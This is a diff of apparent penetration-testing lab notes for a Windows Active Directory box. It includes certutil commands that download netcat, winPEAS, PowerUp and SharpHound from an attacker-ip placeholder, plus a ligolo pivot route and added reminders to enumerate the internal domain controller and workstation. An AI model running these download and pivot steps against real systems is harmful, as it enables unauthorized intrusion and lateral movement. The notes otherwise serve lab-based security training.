@@ -4,12 +4,12 @@ UNPRIVILEGED.
 
 whoami /priv
 
-DOWNLOAD THE FOLLOWING FILES
+DOWNLOAD THE FOLLOWING FILES. FOLLOW ALL OF THESE DOWNLOADS, GO FOR EASIEST WINS FIRST.
 
  - certutil -urlcache -split -f http://<attacker-ip>/nc.exe nc.exe
  - certutil -urlcache -split -f http://<attacker-ip>/winPEAS.exe winPEAS.exe
- - certutil -urlcache -split -f http://<attacker-ip>/PowerUp.ps1 PowerUp.ps1
- - certutil -urlcache -split -f http://<attacker-ip>/sharphound.exe sharp.exe
+ - certutil -urlcache -split -f http://<attacker-ip>/PowerUp.ps1 PowerUp.ps1 --
+ - certutil -urlcache -split -f http://<attacker-ip>/sharphound.exe sharp.exe -- Note: if ldap isn't enabled bloodhound output will suck.
 
 Sharphound should hold all of the AD enumeration needed for this box.
 
@@ -186,4 +186,6 @@ ip route add 10.10.93.0/24 dev ligolo
 LIGOLO TERMINAL
 
 start
+
+ONCE LIGOLO IS SET UP, RUN INITIAL ENUMERATION STEPS ON INTERNAL NETWORK, BOTH DC AND OTHER WORKSTATION.
 
